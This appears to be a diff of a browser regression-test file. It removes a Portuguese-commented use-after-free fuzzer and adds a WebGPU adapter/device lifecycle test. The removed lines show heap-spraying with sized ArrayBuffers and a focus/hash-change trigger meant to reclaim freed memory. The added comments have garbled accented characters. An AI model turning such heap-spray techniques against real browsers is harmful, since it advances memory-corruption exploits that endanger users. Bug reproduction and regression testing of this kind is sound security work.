@@ -1,99 +1,70 @@
-<style>
-  iframe {
-    content: url();
-    zoom: 0.01;
-  }
-</style>
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Teste de Regress�o: WebGPU Device::instance() em Threads Secund�rias</title>
+</head>
+<body>
+<div id="status">Executando teste...</div>
+
 <script>
-  // ── Estado do fuzzer (fora do onload, igual às vars globais do original) ──
-  let ciclo = 0;
-  const MAX_CICLOS = 150;
-  const SIZE_CLASSES = [0x100, 0x140, 0x180, 0x1c0, 0x200, 0x240, 0x280];
-  let _spray = null;
-  const anomalias = [];
-
-  function fazerSpray(sz) {
-    _spray = null;                          // solta anterior → GC → slot livre
-    const buf = [];
-    for (let i = 0; i < 512; i++) {
-      const ab = new ArrayBuffer(sz);
-      new Uint32Array(ab).fill(0x41414141); // canário detectável se lido como ptr
-      buf.push(ab);
+// Fun��o utilit�ria de GC via aloca��o recursiva de mem�ria
+function gc() {
+    function gcRec(n) {
+        if (n < 1)
+            return {};
+        var temp = { i: "ab" + i + (i / 100000) };
+        temp += "foo";
+        gcRec(n - 1);
     }
-    _spray = buf;                           // mantém vivo até próxima chamada
-  }
+    for (var i = 0; i < 1000; i++)
+        gcRec(10);
+}
 
-  function checar(tag, sz) {
-    try {
-      const r = i0.getBoundingClientRect();
-      if (r.width === 0 && r.height === 0)
-        registrar(tag, 'geometry-zero', sz);
-    } catch(e) { registrar(tag, 'BoundingRect:' + e.message, sz); }
-
-    try { void document.documentElement.offsetHeight; }
-    catch(e) { registrar(tag, 'offsetHeight:' + e.message, sz); }
-
-    try {
-      const rng = document.createRange();
-      rng.selectNode(i0);
-      rng.getClientRects();
-      rng.detach();
-    } catch(e) { registrar(tag, 'Range:' + e.message, sz); }
-  }
-
-  function registrar(tag, tipo, sz) {
-    const e = { ciclo, sz: '0x' + sz.toString(16), tag, tipo };
-    anomalias.push(e);
-    console.log('[!] ANOMALIA ' + JSON.stringify(e));
-  }
-
-  function relatorio() {
-    console.log('[FUZZER] ciclos=' + ciclo + ' anomalias=' + anomalias.length);
-    if (anomalias.length > 0) {
-      const freq = {};
-      anomalias.forEach(a => { freq[a.sz] = (freq[a.sz] || 0) + 1; });
-      const top = Object.entries(freq).sort((a, b) => b[1] - a[1])[0];
-      console.log('[FUZZER] size class candidata: ' + top[0] +
-                  ' (' + top[1] + ' anomalias)');
-      console.log('[FUZZER] detalhe: ' + JSON.stringify(anomalias));
-    } else {
-      console.log('[FUZZER] sem anomalia JS — UAF ocorre em nivel C++ puro');
-      console.log('[FUZZER] proximo passo: Remote Inspector durante as iteracoes');
-    }
-  }
-
-  // ── Idêntico ao seu teste — só onfocus recebe o fuzzer ──────────────────
-  onload = () => {
-    document.documentElement.append(document.createElement('frameset'));
-
-    i0.onfocus = () => {
-      if (ciclo >= MAX_CICLOS) {
-        i0.onfocus = null;
-        relatorio();
+async function runWebGPUTest() {
+    if (!navigator.gpu) {
+        document.getElementById("status").innerText = "PASS: WebGPU n�o suportado neste ambiente.";
         return;
-      }
+    }
 
-      const sz = SIZE_CLASSES[ciclo % SIZE_CLASSES.length];
+    for (let cycle = 0; cycle < 40; cycle++) {
+        // 1. Requisita um Adapter
+        let adapter = await navigator.gpu.requestAdapter();
+        if (!adapter) break;
 
-      fazerSpray(sz);         // pré-hash: ocupa slot antes do free()
-      checar('pre', sz);
+        // 2. Cria o Device a partir do Adapter
+        const device = await adapter.requestDevice();
 
-      location.hash = 'y';   // ← intacto — mantém o loop
+        // 3. Descarta a refer�ncia do Adapter na main thread e for�a o GC
+        // Sem o patch, a destrui��o do Adapter concorrente ao uso interno do Device gerava UAF
+        adapter = null;
+        gc();
 
-      fazerSpray(sz);         // pós-hash: ocupa slot após o free()
-      checar('post', sz);
+        // 4. Dispara opera��es ass�ncronas e submiss�es na fila para exercitar a thread de trabalho
+        const buffer = device.createBuffer({
+            size: 1024,
+            usage: GPUBufferUsage.COPY_SRC | GPUBufferUsage.COPY_DST
+        });
 
-      if (ciclo % 10 === 0)
-        console.log('[FUZZER] ciclo=' + ciclo +
-                    ' sz=0x' + sz.toString(16));
-      ciclo++;
-    };
+        const commandEncoder = device.createCommandEncoder();
+        const commandBuffer = commandEncoder.finish();
+        device.queue.submit([commandBuffer]);
 
-    location.hash = 'x';     // ← intacto
+        // 5. Destr�i o buffer e o device
+        buffer.destroy();
+        device.destroy();
 
-    let s0 = document.createElement('script');
-    s0.src = `data:text/javascript,caches.has('a').then(() => i0.focus());`;
-    document.head.append(s0);
-  };
+        if (cycle % 5 === 0) {
+            gc();
+        }
+    }
+
+    document.getElementById("status").innerText = "PASS: Ciclos de vida de Adapter/Device executados sem UAF concorrente.";
+}
+
+runWebGPUTest().catch((err) => {
+    document.getElementById("status").innerText = "FAIL: " + err.message;
+});
 </script>
-<iframe id="i0"></iframe>
+</body>
+</html>
